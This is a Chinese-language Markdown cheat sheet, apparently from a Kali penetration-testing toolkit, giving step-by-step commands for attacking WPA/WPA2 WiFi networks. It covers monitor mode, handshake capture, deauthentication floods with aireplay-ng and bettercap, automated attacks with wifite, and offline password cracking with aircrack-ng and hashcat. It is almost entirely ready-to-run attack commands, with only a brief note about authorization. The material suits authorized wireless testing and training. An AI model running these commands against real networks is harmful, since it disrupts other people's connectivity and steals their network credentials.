# 无线与近源
WiFi 渗透全流程:监听模式、握手包捕获与离线破解,以及近源 WiFi 侦察/反认证。

本文件工具:aircrack-ng 套件(airmon-ng/airodump-ng/aireplay-ng/aircrack-ng)、wifite、bettercap(近源)、hcxtools(hcxpcapngtool)

前置要求(重要):
- 全部操作需要 **root(sudo)**,且无线网卡必须支持**监听模式(monitor)**;虚拟机里需把 USB 无线网卡直通进 Kali。
- 检查网卡:`iw config` 或 `sudo airmon-ng`(看 PHY/Interface 列);`iw phy` 输出中含 `monitor` 才支持。
- 仅对**授权**的目标测试;deauth 在部分国家/地区属违法行为。
- 字典默认用 /usr/share/wordlists/rockyou.txt.gz,首次需解压(见 aircrack-ng 小节)。

## aircrack-ng 套件 — WPA/WPA2 握手包捕获与离线字典破解全流程
来源:apt 包 `aircrack-ng`(airmon-ng/airodump-ng/aireplay-ng 在 /usr/sbin,aircrack-ng 在 /usr/bin)

```bash
# 第 1 步:清理干扰进程并开启监听模式(wlan0 -> wlan0mon)
sudo airmon-ng check kill          # 杀掉 NetworkManager 等会干扰抓包的进程
sudo airmon-ng start wlan0         # 将 wlan0 切为监听模式,生成 wlan0mon 接口
iwconfig                           # 确认 wlan0mon 存在且 Mode:Monitor
```

```bash
# 第 2 步:侦察目标 AP,锁定信道定向抓包
sudo airodump-ng wlan0mon                                        # 全信道扫描:记录目标 BSSID、信道(CH)、加密(ENC)
sudo airodump-ng -c <信道> --bssid <AP的MAC> -w capture wlan0mon # 锁定 AP 抓包并落盘;出现 WPA handshake: <AP的MAC> 即成功
```

```bash
# 第 3 步:另一终端发送反认证(deauth),迫使客户端重连以触发握手
sudo aireplay-ng -0 5 -a <AP的MAC> -c <客户端MAC> wlan0mon   # 定向 deauth 指定客户端 5 次(推荐,影响最小)
sudo aireplay-ng -0 0 -a <AP的MAC> wlan0mon                  # 0 = 持续广播 deauth(较猛,慎用)
```

```bash
# 第 4 步:离线字典破解握手包
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz             # 首次使用先解压字典(-k 保留原 gz 文件)
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <AP的MAC> capture-01.cap   # 破解;KEY FOUND 即出密码
```

参数速查:
- airmon-ng `start <网卡> [信道]` 开启监听模式(可同时锁信道)
- airmon-ng `check kill` 清理会冲突的进程
- airodump-ng `-c <信道>` 锁定信道(跳频会丢包,务必锁定)
- airodump-ng `--bssid <MAC>` 只抓指定 AP
- airodump-ng `-w <前缀>` 保存 cap 文件的前缀
- airodump-ng `--band a` 扫描 5GHz 频段
- aireplay-ng `-0 <次数>` 反认证攻击(deauth)
- aireplay-ng `-a <AP的MAC>` / `-c <客户端MAC>` 指定 AP / 客户端
- aircrack-ng `-w <字典>` 指定字典(逗号分隔可多个)
- aircrack-ng `-b <AP的MAC>` 只破解指定 BSSID 的握手

注意: 需要 root + 监听模式网卡;握手包只需客户端重连瞬间即可捕获,抓不到就再 deauth 几轮或等设备自然重连;5GHz 目标记得 `--band a`;破解转移到大字典/规则时优先用 hashcat(见 hcxtools 小节)。

## wifite — 自动化 WiFi 攻击(自动扫场、抓握手、调字典破解)
来源:apt 包 `wifite`(/usr/sbin/wifite,wifite2 v2.8.2)

```bash
# 一键自动化:自动开启监听、扫描周围 AP,交互选中目标后自动 deauth+抓握手+破解
sudo wifite                       # 默认抓 WPA 握手,抓到后自动用内置字典尝试
sudo wifite --kill                # 同上,并先杀掉冲突进程(等价 airmon-ng check kill)
```

```bash
# 常用组合:指定破解字典(rockyou 需先按上文解压)
sudo wifite --kill --dict /usr/share/wordlists/rockyou.txt
```

参数速查:
- `--kill` 自动清理冲突进程
- `--dict <文件>` 握手破解字典
- `-i <网卡>` 指定无线网卡
- `-c <信道>` 只扫指定信道
- `--pillage` 对所有已保存信息的 AP 轮番攻击
- `--wps` 只打 WPS 漏洞(reaver/pixiedust)
- `--wpat` 限定 WPA 目标;`--wep` 限定 WEP 目标
- `--clients-only` 只攻击有客户端在线的 AP

注意: 需要 root + 监听模式网卡;wifite 本质是 aircrack-ng/reaver 等的自动化封装,失败原因(驱动不支持注入、信号弱)要回到 aircrack-ng 套件手工排查;抓到的 cap 文件在当前目录 `hs/` 下,可转 22000 用 hashcat 继续跑。

## bettercap(近源)— WiFi 侦察、信道锁定与反认证
来源:apt 包 `bettercap`(/usr/bin/bettercap,v2.41)

```bash
# 用监听模式网卡启动(先用 06/aircrack 小节切好 monitor;或直接指定 wlan0)
sudo bettercap -iface wlan0mon
```

```bash
# === 以下为 bettercap 控制台命令(非 shell)===
# wifi.recon on                       # 开启 WiFi 侦察,持续收集周围 AP 与关联客户端
# wifi.recon.channel <信道>            # 锁定信道专注抓目标(如 6);clear 恢复跳频
# wifi.show                           # 表格列出 AP:ESSID/BSSID/信道/信号/客户端数
# wifi.show.assoc <AP的BSSID>          # 查看关联到目标 AP 的客户端 MAC
# wifi.deauth <AP的BSSID>              # 对目标 AP 反认证,握手包自动存入 bettercap-wifi-handshakes.pcap
```

参数速查:
- `-iface <网卡>` 启动参数:指定监听接口
- 控制台 `wifi.recon on` WiFi 侦察开关
- 控制台 `wifi.recon.channel <信道>` 锁定信道(多个用逗号)
- 控制台 `wifi.show` 列出发现的 AP
- 控制台 `wifi.show.assoc <BSSID>` 列出 AP 的客户端
- 控制台 `wifi.deauth <BSSID>` 反认证攻击
- 控制台 `set wifi.deauth.open true` 对开放网络也发 deauth
- 控制台 `set wifi.handshakes.file <文件>` 自定义握手包保存路径
- 控制台 `set wifi.show.manufacturer true` 显示厂商

注意: 需要 root + 监听模式网卡,且网卡须支持 packet injection 才能发 deauth;握手包文件(bettercap-wifi-handshakes.pcap)生成在启动 bettercap 的工作目录,直接交给下述 hcxpcapngtool;周围 AP 很多时先 `wifi.recon.channel` 锁定目标信道,信噪比决定握手成功率。

## hcxtools(hcxpcapngtool)— 握手包转哈希,交给 hashcat 高速破解
来源:apt 包 `hcxtools`(/usr/bin/hcxpcapngtool,v7.1.2)

```bash
# 把 airodump-ng 抓的握手包转成 hashcat 22000 格式(同时兼容 PMKID 与 EAPOL)
hcxpcapngtool -o hash.22000 capture-01.cap                       # airodump 的 cap 文件
hcxpcapngtool -o hash.22000 bettercap-wifi-handshakes.pcap       # bettercap 抓的握手包同样可转
```

```bash
# hashcat 字典破解(-m 22000 为 WPA-PBKDF2 PMKID+EAPOL 通用格式,GPU 远快于 aircrack-ng)
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt     # 字典需先 gunzip(见 aircrack 小节)
hashcat -m 22000 hash.22000 --show                               # 查看已破解结果
```

参数速查:
- `-o <文件.22000>` 输出 hashcat 22000 格式哈希(核心参数)
- `-E <文件.essid>` 顺带导出 ESSID 列表(可作字典组合素材)
- `-I <文件.identity>` 导出身份列表
- `--pmkid=<文件>` 另存旧版 PMKID 格式(分隔符 *)
- `--max-essids=<数量>` 限制 ESSID 数量防超大包
- hashcat `-m 22000` WPA/WPA2/PMKID 通用哈希模式
- hashcat `--show` 显示已破解;`-r <规则文件>` 规则变形破解

注意: 需要 root 运行 hcxpcapngtool 读取 cap;若输出提示 "no hashes" 说明握手不完整,回 aircrack-ng 小节重新 deauth 捕获;想不依赖客户端、主动触发 PMKID,可 `sudo apt install hcxdumptool` 用 hcxdumptool 直接抓(联网装包前记得 export http_proxy=http://10.211.55.2:2334)。
hashcat 的字典/规则/掩码/会话续跑全参数见 [04-密码攻击.md](04-密码攻击.md) 的 hashcat 节(-m 22000 已列在其 -m 编号表,字典/规则用法同源)。
